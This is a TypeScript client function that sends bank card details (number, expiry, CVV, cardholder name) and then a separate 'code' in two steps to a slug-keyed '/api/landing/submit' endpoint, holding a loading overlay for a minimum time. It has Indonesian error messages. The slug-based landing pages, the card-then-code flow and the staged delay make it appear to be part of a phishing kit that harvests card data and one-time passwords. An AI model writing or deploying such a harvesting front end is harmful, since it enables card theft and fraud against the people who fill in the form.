import type { BankFormData } from './bank-types';
import { OVERLAY_MIN_MS } from './constants';

export async function submitBankStep(
  slug: string,
  step: 1 | 2,
  formData: BankFormData,
  overlayMinMs = OVERLAY_MIN_MS
): Promise<{ success: boolean; error?: string }> {
  const start = Date.now();

  try {
    const response = await fetch('/api/landing/submit', {
      method: 'POST',
      credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        slug,
        step,
        product: 'bank',
        cardNumber: formData.cardNumber,
        expiry: formData.expiry,
        cvv: formData.cvv,
        cardName: formData.cardName,
        isPrimary: formData.isPrimary,
        code: formData.code,
      }),
    });

    const data = (await response.json()) as { success?: boolean; error?: string };

    const remaining = overlayMinMs - (Date.now() - start);
    if (remaining > 0) {
      await new Promise((resolve) => setTimeout(resolve, remaining));
    }

    if (!response.ok || !data.success) {
      return { success: false, error: data.error || 'Gagal mengirim data.' };
    }

    return { success: true };
  } catch {
    const remaining = overlayMinMs - (Date.now() - start);
    if (remaining > 0) {
      await new Promise((resolve) => setTimeout(resolve, remaining));
    }
    return { success: false, error: 'Terjadi kesalahan jaringan.' };
  }
}
